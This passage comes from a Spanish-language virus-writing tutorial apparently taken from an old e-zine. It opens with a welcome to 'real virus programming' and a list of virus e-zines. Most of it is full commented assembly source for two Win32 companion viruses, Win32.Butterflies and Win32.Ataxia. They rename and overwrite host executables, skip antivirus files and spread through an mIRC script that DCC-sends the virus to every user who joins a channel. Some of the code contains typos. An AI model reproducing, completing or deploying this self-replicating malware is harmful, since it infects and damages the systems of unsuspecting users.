+-Xine #2,3 y 4.
+
+-Asterix #2
+
+-The Matrix #1
+
+-Vx-Stacy #1 (Excelente , buscarla en la pagina de Lord Julus)
+
+-Vlad #5 y #6
+
+En realida las e-zines es lo mejor que existe ya que fuera de tener tutoriales traen un monton 
+de codigo fuente para aprender y analizar .
+
+*Documentacion Tecnica :
+
+-Win32.Hlp (Imprescindible!)
+
+-Todos los SDK y DDK de cualquier version de windows que puedan encontrar en www.microsoft.com.
+
+-PE Format by Micheal J. O'Leary
+
+*Y mucho CEREBRO .
+
+**Nota : Muchos de los archivos y programas mencionados aqui estaran dentro de poco en nuestra
+         web page **
+
+Finalmente quiero agradecerles por la atencion prestada , y decirles que si tienen alguna duda ,
+una idea y necesita alguien con quien consultarla ,o lo que sea , escriban a mi email , y desde
+luego darles la bienvenida a el emocionante mundo de la programacion de virus de Verdad!.
+
+A continuacion voy a comentar dos virus extraidos de la revista MetaPhase #2 , los escogi por lo
+basico de su codigo , y porque no tenian la fuente comentada (Para que no digan que simplemnte 
+me dedico a traducir los comentarios)
+
+
+
+Los Virus 
+=== =====
+
+Este es un simple virus de companion compatible con win32 , al usar solo llamdas al API normal.
+Un virus companion es uno que no infecta el ejcutable sin que le cambia de nombre y lo remplaza
+por otro archivo que se remplaza primero para hacer lo que quiera y luego ejecuta el veradero 
+ejecutable. Esto en DOS se lograba creando un archivo .COM ya que estos se ejecutaban primero 
+que los exes .Y como se logra esto en windows? , pues facil  , primero copiamos nuestro "virus"
+con el nombre del ejecutable (Ejemplo victima.exe) y luego el exe original lo nombramos como 
+victima.vxe o la extension que queramos , luego desde el virus y con la funcion WinExec o Create
+Process ejecutamos el .vxe . Si este no esta sacamos un mensaje de error reclamando el archivo
+y listo . 
+Espero que hayan entendido bien para que puedan entender este codigo fuente y hasta hacer su 
+propio virus , por cierto si alguna funcion no queda en claro les recomiendo mirar el archivo 
+Win32.Hlp 
+Otra caracteristica especial es que usa unpequeño script para propagarse por medio del Mirc .
+
+
+<-------------------------Here Start Win32.ButterFiles By Twizter/Nuke------------------------->
+
+
+;Win32.Butterflies By Twizter/NuKe
+
+.386p
+
+.model flat   ;Setting para el Tasm
+
+.code
+
+;=============================
+
+extrn	GetSystemDirectoryA:proc 
+extrn	GetWindowsDirectoryA:proc 
+extrn	lstrcat:proc 
+extrn	ExitProcess:proc 
+extrn	GetModuleHandleA:proc 
+extrn	GetModuleFileNameA:proc 
+extrn	FindFirstFileA:proc 
+extrn	FindNextFileA:proc 
+extrn	CopyFileA:proc 
+extrn	DeleteFileA:proc 
+extrn	MoveFileA:proc 
+extrn	_lopen:proc 
+extrn	_lwrite:proc 
+extrn	_lclose:proc 
+extrn	WinExec:proc 
+extrn	SetFilePointer:proc 
+extrn	GetCurrentDirectoryA:proc 
+extrn	SetCurrentDirectory:proc 
+extrn	_lread:proc 
+extrn	_lcreat:proc 
+extrn	SetCurrentDirectoryA:proc; Declaramos todas las funciones que vayamos a usar  
+;=============================
+
+include windows.inc
+
+;=============================
+
+_off_	equ	2722d
+_scrpt_	equ	offset end_script - offset IniData1   ;Declaramos el tamaño del Script.ini
+
+;=============================
+
+begin:
+	push	00000001                     ;modo de ejecucion
+   	push	offset cFileName             ;nombre del .vxe el cual se guarda en el exe al momento
+	call	WinExec                      ; de la infeccion
+
+	push	offset path3                 ;Buffer en donde guaradar el Path
+	push	260                          ;Tamaño del buffer
+	call	GetCurrentDirectoryA         ;Obtiene el path del programa
+
+	push 	25                           ;Tamaño del buffer
+	push 	offset path2                 ;Buffer en donde guaradar el Path
+	call 	GetWindowsDirectoryA         ;obtiene el path de windows
+
+      push	offset path2                 
+	call	SetCurrentDirectoryA         ;el directorio ahora es el de windows
+
+	push	offset handle1
+	call	GetModuleHandleA     ;obtiene el handle del modulo de la fila que se esta ejecutando     
+
+	push 	50                   ;Tamaño del buffer
+	push 	offset handle2       ;buffer
+	push 	eax           ;handle del ejecutable que acabmos de obtener con la funcion anterior
+	call	GetModuleFileNameA    ;guardamos el path de este ejcutable en handle2
+
+	push	offset filedta ;estructura que recibe informacion acerca de los archivos encontrados
+	push	offset maska   ; = *.Exe 
+	call	FindFirstFileA ;funcion de buscar archivos 
+
+	mov	dword ptr [handle_],eax      ;guarda el hadle de la busqueda en _handle
+	cmp	eax,	0                      ;si la funcion devolvio un 0 hubo un error o sea que no
+	je	done_this                    ;hay EXEs para infectar .
+
+check:
+;     cmp	nFileSizeLow, 6000d          
+;    	jle	nextfile
+	mov	bx,	word ptr[cFileName]   ;mueve el nombre del archivo encontrado a bx
+	cmp	bx,	'XE'              ;mira a ver si empieza por Ex , para no infectar el explorer
+	je	nextfile                ;si empieza por ex va por el proximo archivo
+	cmp	bx,	'UR'              ;mira a ver si empieza por Ru , para no infectar el RunDllxx
+	je	nextfile                ;si empieza por ex va por el proximo archivo
+      cmp	bx,	'ur'              ;lo mismo
+	je	nextfile                ;igual
+	cmp	bx,	'ME'              ;Em , para no infectar el Emm386.Exe
+	je	nextfile                ;no lo infecta
+	lea	esi,	[cFileName]       ;pone en Esi el nombre del file
+	lea	edi,	[newfilename]     ;pone en edi un buffer para guardar el nombre del nuevo file
+stowit:
+	lodsb                         ;mueve un byte de esi a Al
+	cmp	al,	'.'               ;lo compara con el punto
+	je	addext                  ; si ya encontramos el punto vamos a la rutina addext
+	stosb                         ;mueve el byte an al a Edi
+	jmp	stowit                  ;hace un loop hasta encontrar el punto
+addext:
+	stosb                         ;mueve el "." a Edi
+	lea	esi,	[newext]          ;pone en esi la extension vxe 
+	movsw                         ;mueve el contenido de Esi (vxe) a Edi
+	movsw                         ;mueve el contenido de Esi (vxe) a Edi
+	push	0                       ;Flags
+	push	offset newfilename      ;nombre con la extension .Vxe
+	push	offset cFileName        ;nombre con la extension .Exe
+	call	MoveFileA               ;convierte el .exe a . vxe
+
+	push	0                       ;Flag
+	push	offset cFileName        ;nombre del .exe
+	push	offset handle2          ;nombre del virus que se esta ejecutando
+	call	CopyFileA     ;con esta funcion copiamos este virus con el antiguo nombre del .exe
+
+	push	2                 ;Write_Mode
+	push	offset cFileName  ;abrimos el .exe "infectado"
+	call	_lopen            ;Oopen file
+
+
+      mov	dword ptr [_handle],eax    ;guarda el handle del archivo abierto
+
+	push	dword 0          ;how to move ; desde el file begin
+	push	NULL               
+	push	_off_            ;offset a donde mover el puntero del file
+	push	eax              ;handle del file 
+	call	SetFilePointer   ;movemos el puntero a la posicion donde se escribira el nombre del  
+                             ;.vxe 
+
+	mov	eax,	dword ptr [_handle] ;mueve el handle a Eax
+	push	50                        ;numero de byes a escribir
+	push	offset newfilename        ;bytes que vamos a escribir
+	push	eax                       ;handle del file a escribir
+	call	_lwrite  ;de esta forma si por ejemplo infectamos write.exe , en el nuevo write.exe
+                     ;se guardara el nombre write.vxe para luego ejecutarlo
+
+	push	eax      ;handle del archivo
+	call	_lclose  ;close the file 
+
+nextfile:
+
+	push	offset filedta  ;estructura donde guardar la informacion de los archivos encontrados
+	mov	eax,	dword ptr [handle_] ;handle de la primera busqueda
+	push	eax        
+	call	FindNextFileA      ;buscamos el sigueiente exe 
+
+	cmp	eax,	0            ;si no hay mas files 
+  	je	done_this          :saltamos a done_this
+	jmp	check
+
+done_this:
+
+	push 	25                ;tamaño del buffer
+	push 	offset path1      ;buffer donde guardar
+	call 	GetSystemDirectoryA ; el directorio system ("C:\Windows\System\")
+
+      push 	offset handle3   ;cadena que contiene "\FlyingButterflies.scr"
+	push 	offset path1     ;path de system
+	call 	lstrcat          ;juntamos las dos cadenas 
+
+	push	0                ;flag
+	push	offset path1     ;nombre que se obtuvo en la funcion anterior
+	push	offset handle2   ;nombre de este file ("e.g:Virus.Exe")
+	call	CopyFileA        ;movemos el virus al dir. system para mandarlo con Mirc
+
+	push	2                ;flag
+	push	offset MircLNK   ;nombre del acceso directo de mirc
+	call	_lopen           :lo abrimos
+
+	mov	dword ptr [_handle],eax  ;handle de mirc.lnk en Eax
+	push	dword 2
+	push	NULL
+	push	-50
+	push	eax
+	call	SetFilePointer    ;nos movemos al offset -50 para ver el path de mirc  
+	mov	eax,	dword ptr [_handle]
+
+	push	50
+	push	offset MircDir
+	push	eax
+	call	_lread      ;leemos 50 bytes en donde debe estar el path de mirc
+
+	push	eax
+	call	_lclose  ;cerramos el acceso directo  
+
+	std
+	lea	esi,	MircIni      ;ponemos en Esi el path de mirc
+
+get_next_byte:
+	lodsb                  ;movemos un byte de esi a al
+	cmp	al,	':'        ;vemos si ya encontramos los dos puntos
+	jne	get_next_byte    ;loop
+
+	push 	offset MircIni   ; = \script.ini
+	push 	esi              ;path del mirc
+	call 	lstrcat          ;juntamos los dos 
+
+	push	0                ;flag
+	push	esi              ;nombre del archivo script.ini
+	call	_lcreate         ;creamos o sobreescribimos el file 
+
+	push	_scrpt_          ;numero de bytes a escribir 
+	push	offset IniData1  ;contenido del script.ini
+	push	eax              ;handle del archivo creado 
+	call	_lwrite          ;escribimos el archivo 
+
+	push	eax              ;handle 
+	call	_lclose          ;cerramos el archivo
+
+	push	offset path3             ;Path original
+	call	SetCurrentDirectoryA     ;restauramos el path del principio
+
+	push	0
+	call	ExitProcess              ; y terminamos
+
+;=============================
+
+.data
+handle1		db	50 	dup(0)
+handle2		db	50 	dup(0)
+maska		db	'*.exe',0
+
+newext		db	'vxe',0
+handle_		dd	0
+_handle		dd	0
+filedta:
+FileAttributes	dd	0
+CreationTime 	db	8	dup(0)
+LastAccessTime	db	8	dup(0)
+LastWriteTime	db	8	dup(0)
+nFileSizeHigh	dd	0
+nFileSizeLow	dd	0
+dwReserved0	dd	0
+dwReserved1	dd	0
+cFileName	db	50	dup('N')
+cAltFileName	db	14	dup(0)
+newfilename	db	50	dup(0)
+
+path2		db	25	dup(0)
+path3		db	260	dup(0)
+MircLNK		db	'Start Menu\Programs\mIRC\mIRC32.LNK',0
+MircDir		db	50	dup(0)
+
+MircIni		db	'\script.ini',0
+Mirc_		db	'c:\mirc\script.ini',0
+IniData1:
+		db	'[Script]',0dh,0ah
+		db	'n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }',0dh,0ah
+		db	'n1=  /dcc send $nick '
+path1		db	25	dup(0)
+handle3		db	'\FlyingButterflies.scr',0,'}'
+		db	100	dup(0)
+end_script:
+
+		
+	end	begin
+
+
+<-------------------------Here Ends  Win32.ButterFiles By Twizter/Nuke------------------------->
+Bueno solo queda aclara que una caracteristica de este virus es que usa funciones extrañas como
+_lcreate , _lopen , y demas para ser compatible con win31 , aunque si se ejecuta en Win31 lo 
+mas probable es que lo arruine ya que infectara archivos como progman.exe y otros importantes; 
+en si el virus resulta muy estupido ya que solo infecta los archivos de windows , ni siquiera 
+infecta un solo archivo del path actual o algo por el estilo , y generalmente nadie intercambia
+exes de windows , y si lo que queria era hacer un worm de mirc , pues no veo razon para infectar
+el directorio de windows , ojala hayan entendido todo , y si no vuelvanlo a leer hasta que 
+entiendan ya que el que sigue es un  poco mas complicado .
+
+
+
+Win32.Ataxia es parecido al anterior pero hace algo que yo encuentro muy estupido , guarda en el
+.vxe no solo el ejecutable original sino que le agrega el cuerpo del virus para luego separarlos
+en memoria y ejecutar el .exe origina y usar el virus como fuente de infeccion, como si no se pu
+diera simplemente usar el exe original como fuente para infectar,lo mas posible es que este sea
+el primer virus de win32 de Evul.Una mejora respecto al virus anterior es que este infecta 5 EXE
+en el directorio de windows , 5 en el Root,y 5 en el directorio actual lo cual le brinda mayores
+posibilidades de salir de una maquina. Lo mejor de este virus es que por su metodo de infeccion 
+no daña ningun ejecutable independiente de que este sea de un formato especial como SFX,install-
+Shield , MSI o cualquier tipo especial de exe compreso o encryptado. Igual que el virus anterior
+es de Evul Del Grupo MetaPhase , un grupo que tiene una buena E-Zine en formato .Hlpy que llevan
+2 entregas. Resulta interesanto sobre todo para coders de lenguajes de alto nivel tipo VBA o 
+VBScript , y su URL es http://www.coderz.net/metaphase/
+
+
+
+<----------------------------Here Start Win32.Ataxia By Twizter/Nuke--------------------------->
+
+
+;Win32.Ataxia By Evul
+
+.386p
+.model flat
+.code                    ;setting para el Tasm
+
+;=============================
+extrn	LocalFree:proc;
+extrn	LocalAlloc:proc;
+extrn	GetModuleHandleA:proc;
+extrn	GetModuleFileNameA:proc;
+
+extrn	ExitProcess:proc;
+extrn	WinExec:proc;
+extrn	GetCommandLineA:proc;
+
+extrn	_lopen:proc;
+extrn	_lcreat:proc;
+extrn	_lread:proc;
+extrn	_lwrite:proc;
+
+extrn	FindFirstFileA:proc;
+extrn	FindNextFileA:proc;
+extrn	DeleteFileA:proc;
+extrn	MoveFileA:proc;
+extrn	CloseHandle:proc;
+;extrn	CreateFileA:proc;
+extrn	WriteFile:proc;
+
+extrn	GetSystemDirectoryA:proc;
+
+extrn	GetWindowsDirectoryA:proc;
+extrn	GetCurrentDirectoryA:proc;
+extrn	SetCurrentDirectoryA:proc;
+
+extrn	lstrcat:proc;
+
+;=============================     ;funciones del api que vayamos a usar 
+
+include windows.inc
+
+;=============================
+
+virussize	equ	8192             ;constante que contiene el tamaño del virus 
+
+;=============================
+
+begin:	
+
+	mov	ebx,	0ffffffh
+	push	ebx            ;cantidad de memoria a reservar (0ffffffh) 
+	push	LMEM_ZEROINIT  ;flag (inicializar a cero)
+	call	LocalAlloc     ;funcion para separa una cantidad de memoria especficada
+
+	mov	dword ptr [heap], eax     ;puntero a la memoria
+	cmp	eax,	0                   ;si es 0 hubo un error 
+	je	done_this                 ;asi que nos largamos de aqui
+
+fixhost:
+
+	push	offset  handle1	 
+      call	GetModuleHandleA       ;obtiene el handle del archivo ejecutado
+	
+      push 	50 
+	push 	offset handle2
+	push 	eax
+	call	GetModuleFileNameA      ;guarda en handle2 el nombre de este archivo
+
+	push	offset filedta          
+	push	offset handle2
+	call	FindFirstFileA          ;Busca este archivo , para obtener datos sobre el 
+
+	lea	esi,	[cFileName]       ;pone en esi el nombre del file encontrado
+	lea	edi,	[newfilename]     ;apunta edi al buffer del nuevo nombre de file
+stowit_:
+	lodsb
+	cmp	al,	'.'
+	je	addext_
+	stosb
+	jmp	stowit_                  ;busca el punto dentro del nombre del file 
+addext_:
+	stosb
+	lea	esi,	[newext]
+	movsw
+	movsw                         ;le agrega la extension .vxe
+
+	push	0                        
+	push	offset cFileName
+	call	_lopen                  ;abre el archivo .vxe
+
+
+	mov	dword ptr [open_handle],eax   ;guarda el handle del archivo 
+
+	push	dword ptr [nFileSizeLow]      
+      push	dword ptr [heap]
+	push	eax
+	call	_lread                      ;mueve a la memoria el todo el ejecutable
+
+	push	dword ptr [open_handle]
+	call	CloseHandle                  ;cierra el archivo 
+
+	push	0
+	push	offset newfilename
+	call	_lcreate                     ;crea de nuevo el .exe 
+
+	mov	ebx,	dword ptr [nFileSizeLow]
+	sub	ebx,	virussize  ;le resta al tamaño del .exe el del virus para obtener el tamaño
+ 	push	ebx              ;del .exe original        
+
+	mov	ebx,	dword ptr [heap]
+	add	ebx,	virussize       ;mueve el puntero al principio del .exe original
+	push	ebx
+	push	dword ptr [open_handle]
+	call	_lwrite           ;y luego lo escribe con el nombre del exe 
+
+	push	dword ptr [open_handle]
+	call	CloseHandle       ;cierra el .exe
+
+	push	0
+	push	offset evulzfile
+	call	_lcreat            ;crea un archivo con nombre evul.tmo
+
+      mov	dword ptr [open_handle],eax
+      push	virussize
+	push	dword ptr [heap]
+	push	eax
+	call	_lwrite           ; y escribe en este el virus original 
+
+	push	dword ptr [open_handle]
+	call	CloseHandle       ; y cierra evul.tmp
+
+	push	2
+	push	offset evulzfile
+	call	_lopen            ;vuelve y abre evul.tmp    (?????) 
+
+	mov	dword ptr [open_handle],eax
+
+	push	virussize
+	push	dword ptr [heap]
+	push	eax
+	call	_lread         ;lee el virus DE NUEVO a memoria  (?????)
+
+	push	dword ptr [open_handle]
+	call	CloseHandle    ;vuelve y cierra el archivo
+
+
+execit:
+
+	jmp	dirloop      ;salta a la busque de archivos 
+
+FEXY:
+	mov	byte ptr [infected],0  ;pone # de infected a 0
+	push	offset filedta
+      push	offset maska 
+	call	FindFirstFileA         ;busca archivos .exe en el path actual
+
+	mov	dword ptr [handle_],eax ;guarda el handle de busqueda
+	cmp	eax,	0
+	je	done_this               ;si hay un error nos largamos de aqui
+check:
+	mov	bx,	word ptr[cFileName]
+	cmp	bx,	'XE'              ; Explorer ?
+	je	nextfile
+	cmp	bx,	'UR'              ; RUNDll ?
+	je	nextfile
+	cmp	bx,	'ur'              ; rundll ?
+	je	nextfile
+	cmp	bx,	'ME'              ; Emm386 ??
+	je	nextfile
+	cmp	bx,	'va'              ; Antivirus ?
+	je	nextfile
+	cmp	bx,	'sv'              ; Antivirus ?
+	je	nextfile
+	cmp	dword ptr [nFileSizeLow],(0ffffffh-virussize); Muy Grande ??
+	jg	nextfile          ;si cualquiera de las anteriores se cumple no lo infecta
+
+
+	push	2
+	push	offset cFileName
+	call	_lopen            ;abrimos la victima
+
+      mov	dword ptr [open_handle],eax
+
+	mov	ebx,	dword ptr [nFileSizeLow]
+	mov	dword ptr [hostsize], ebx     ;guardamos en ebx el tamaño del exe a infectar
+
+	push	ebx
+	mov	ebx,	dword ptr [heap]
+	add	ebx,	virussize        ;le sumamos al tamaño del exe el tamaño del virus
+
+	push	ebx
+	push	eax
+	call	_lread         ;leemos los datos del exe en la memoria luego del cuerpo del virus
+
+	push	dword ptr [open_handle]
+	call	CloseHandle      ;lo cerramos
+
+	mov	ebx,	dword ptr [heap]   
+	add	ebx,	(virussize+12h)
+
+	cmp	byte ptr [ebx], 'X'
+	je	bail
+	add	ebx,	6
+	cmp	byte ptr [ebx], '@'
+	jne	bail             ;miramos en 12h y en 18h esta la marca de infeccion 
+
+	push	2
+	
+      push	offset cFileName   
+      call	_lopen             ;Volvemos a abrir el archivo (???)
+
+	mov	dword ptr [open_handle],eax
+
+	mov	ebx,	dword ptr [nFileSizeLow]
+	add	ebx,	virussize            ;obtenemos el tamaño del exe mas el del virus 
+	push	ebx
+	push	dword ptr [heap]
+	push	eax
+	call	_lwrite                   ;escribimos el exe nuevo y el virus 
+	inc	byte ptr [infected]
+bail:
+	push	dword ptr [open_handle]
+	call	CloseHandle      ; lo cerramos 
+
+	cmp	byte ptr [infected],5
+	je	done_this           ;si ya infectamos 5 nos largamos 
+
+nextfile:
+
+	push	offset filedta
+	mov	eax,	dword ptr [handle_]
+	push	eax
+	call	FindNextFileA      ;continuamos con la busqueda de EXEs
+
+	cmp	eax,	0
+	je	done_this       ;si no hay mnas nos largamos 
+
+	jmp	check
+
+done_this:
+	ret
+dirloop:
+	call	FEXY              ;se devuelve 
+	push	offset curdir
+	push	260
+	call	GetCurrentDirectoryA
+
+uploop:
+	push	offset updir
+	call	SetCurrentDirectoryA
+	cmp	eax,	1
+	jne	trywindows
+	call	FEXY             ;nos movemos al directorio de arriba (\..) y buscamos otros 5 EXEs
+
+trywindows:
+	push 	260
+	push 	offset windir
+	call 	GetWindowsDirectoryA
+
+	push	offset windir
+	call	SetCurrentDirectoryA
+	call	FEXY         ;nos movemos al directorio de windows y buscamos otros 5 EXEs
+
+	push	offset curdir
+	call	SetCurrentDirectoryA ;restauramos el antiguo dir.
+
+	mov	eax,	dword ptr [heap]
+	call	LocalFree   ;liberamos la memoria reservada 
+
+call	GetCommandLineA
+
+	mov	esi,	eax  ;obtenemos la linea de comandos del ejecutable actual 
+loopdot:
+	mov	edi,	esi
+	lodsb
+	cmp	al,	'.'
+	jne	loopdot      ;busacmso el punto 
+	
+	stosb
+	lea	esi,	[fixcmd]
+	movsw
+	movsw       ;le agrgamos la extension VXE
+
+	call	GetCommandLineA
+
+	push	00000001
+	inc	eax
+	push	eax
+	call	WinExec    ; y lo ejecutamos fianlmente
+
+deleteit:
+
+	push	offset newfilename
+	call	DeleteFileA    ;borramos el archivo .exe temporal 
+
+	cmp	eax,	0
+	je	deleteit       ;si hay un error lo volvemos a borrar 
+
+	push	offset evulzfile
+	call	DeleteFileA       ; borramos el evul.tmp
+
+
+	push	0
+	call	ExitProcess  ; y por fin terminamos
+
+;=============================
+
+.data
+windir		db	260	dup(0)
+curdir		db	260	dup(0)
+maska		db	'*.exe',0
+newext		db	'VXE',0
+fixcmd		db	'VXE '
+evulzfile	db	'Evul.tmp',0
+handle_		dd	0
+open_handle	dd	0
+heap		dd	0
+hostsize	dd	0
+commandline	dd	0
+updir		db	'..',0
+
+filedta:
+
+FileAttributes	dd	0
+CreationTime 	db	8	dup(0)
+LastAccessTime	db	8	dup(0)
+LastWriteTime	db	8	dup(0)
+nFileSizeHigh	dd	0
+nFileSizeLow	dd	0
+dwReserved0	dd	0
+dwReserved1	dd	0
+
+cFileName	db	50	dup(0)
+cAltFileName	db	50	dup(0)
+handle1		db	50 	dup(0)
+handle2		db	50 	dup(0)
+written		dd	0
+infected	db	0
+newfilename	db	50	dup(0)
+
+	end	begin
+
+<-----------------------------Here Ends Win32.Ataxia By Twizter/Nuke--------------------------->
+
+Solo me queda decir que este es un virus con unas cosas muy RARAS y sin sentido , pero espero igualmente que hayan entendido y
+juzgado por ustedes mismos para aprender algo 
+
+
+                                   Vil Roach / Trenchcoat Legion - The Man Who Sold The World
+ 
+ 
